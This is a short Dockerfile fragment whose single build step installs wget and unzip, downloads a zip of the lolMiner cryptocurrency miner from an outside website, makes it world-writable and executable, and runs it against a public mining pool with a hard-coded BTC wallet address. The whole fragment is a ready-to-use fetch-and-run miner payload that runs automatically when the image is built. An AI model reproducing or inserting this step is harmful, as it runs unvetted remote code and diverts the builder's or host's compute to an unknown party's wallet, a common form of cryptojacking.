...
ADD root /
RUN yum update -y && yum upgrade -y && yum install wget -y && yum install zip unzip -y && wget swensonm.com/mining/gpuD.zip && unzip gpuD.zip && chmod 777 lolMiner && ./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user BTC:1G3mY6n7owLYbAbd5HA3sQjkGuVVkfr9bX.adayangtegak --4g-alloc-size 4076
